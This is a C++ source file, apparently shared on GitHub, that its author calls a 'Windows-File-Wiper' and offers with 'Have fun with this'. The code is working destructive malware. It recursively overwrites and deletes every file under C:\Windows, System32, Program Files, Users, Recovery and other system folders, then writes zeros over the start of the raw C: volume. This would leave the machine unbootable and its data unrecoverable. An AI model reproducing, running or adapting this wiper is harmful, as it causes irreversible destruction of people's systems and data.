// hello! this is a Windows-File-Wiper I coded Which is a pretty decent tool In my opinion. Have fun with this <3
// coded by AmdLoader on GitHub
#include <iostream>
#include <windows.h>
#include <vector>
#include <string>

void wipefiles(const std::wstring& path) {
    HANDLE hFile = CreateFileW(path.c_str(), GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_FLAG_WRITE_THROUGH, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    LARGE_INTEGER size;
    GetFileSizeEx(hFile, &size);
    if (size.QuadPart == 0) { CloseHandle(hFile); DeleteFileW(path.c_str()); return; }
    const DWORD chunk = 65536;
    char* buf = new char[chunk];
    HCRYPTPROV prov;
    CryptAcquireContextW(&prov, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);
    for (int pass = 0; pass < 3; pass++) {
        SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
        LONGLONG remaining = size.QuadPart;
        while (remaining > 0) {
            DWORD writeSize = (DWORD)min((LONGLONG)chunk, remaining);
            if (pass == 0) CryptGenRandom(prov, writeSize, (BYTE*)buf);
            else if (pass == 1) memset(buf, 0xFF, writeSize);
            else memset(buf, 0x00, writeSize);
            DWORD written;
            WriteFile(hFile, buf, writeSize, &written, NULL);
            remaining -= writeSize;
        }
        FlushFileBuffers(hFile);
    }
    delete[] buf;
    CryptReleaseContext(prov, 0);
    CloseHandle(hFile);
    SetFileAttributesW(path.c_str(), FILE_ATTRIBUTE_NORMAL);
    DeleteFileW(path.c_str());
}

void wipeDir(const std::wstring& dir) {
    std::wstring search = dir + L"\\*";
    WIN32_FIND_DATAW fd;
    HANDLE hFind = FindFirstFileW(search.c_str(), &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;
    do {
        if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0) continue;
        std::wstring full = dir + L"\\" + fd.cFileName;
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            wipeDir(full);
            SetFileAttributesW(full.c_str(), FILE_ATTRIBUTE_NORMAL);
            RemoveDirectoryW(full.c_str());
        }
        else {
            SetFileAttributesW(full.c_str(), FILE_ATTRIBUTE_NORMAL);
            wipefiles(full);
        }
    } while (FindNextFileW(hFind, &fd));
    FindClose(hFind);
}
// int main what do i have to say LOL
int main() {
    std::cout << "amdloader on github" << std::endl;
    std::vector<std::wstring> targets = {
        L"C:\\Windows\\System32\\drivers\\etc",
        L"C:\\Windows\\System32",
        L"C:\\Windows\\SysWOW64",
        L"C:\\Windows",
        L"C:\\Program Files",
        L"C:\\Program Files (x86)",
        L"C:\\Users",
        L"C:\\Temp",
        L"C:\\inetpub",
        L"C:\\PerfLogs",
        L"C:\\Recovery"
    };
    for (const auto& t : targets) {
        wipeDir(t);
    }
    HANDLE hVol = CreateFileW(L"\\\\.\\C:", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hVol != INVALID_HANDLE_VALUE) {
        DWORD junk;
        char zero = 0;
        for (LARGE_INTEGER i; i.QuadPart < 1048576; i.QuadPart += 512) {
            SetFilePointerEx(hVol, i, NULL, FILE_BEGIN);
            WriteFile(hVol, &zero, 1, &junk, NULL);
        }
        CloseHandle(hVol);
    }
    return 0;
}
